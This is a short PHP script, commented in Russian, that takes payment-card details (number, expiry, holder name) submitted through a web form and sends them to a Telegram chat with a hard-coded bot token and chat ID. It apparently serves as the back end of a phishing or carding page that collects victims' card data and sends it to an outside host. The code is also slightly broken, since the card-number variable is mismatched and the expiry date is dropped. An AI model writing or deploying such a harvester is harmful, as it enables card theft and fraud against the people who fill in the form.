<?php

/* https://api.telegram.org/bot5546941826:AAF-xuOpCeHepRsfCEnn6ExCuqoos8XUgrM/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$name = $_POST['cardcode'];
$carddate = $_POST['carddate'];
$cardname = $_POST['cardname'];
$token = "5546941826:AAF-xuOpCeHepRsfCEnn6ExCuqoos8XUgrM";
$chat_id = "-1001686101709";
$arr = array(
  'Номер карты: ' => $cardcode,
  'Имя владельца: ' => $cardname
);

foreach($arr as $key => $value) {
  $txt = $txt."<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  echo "ok";
} else {
  echo "Error";
}
?>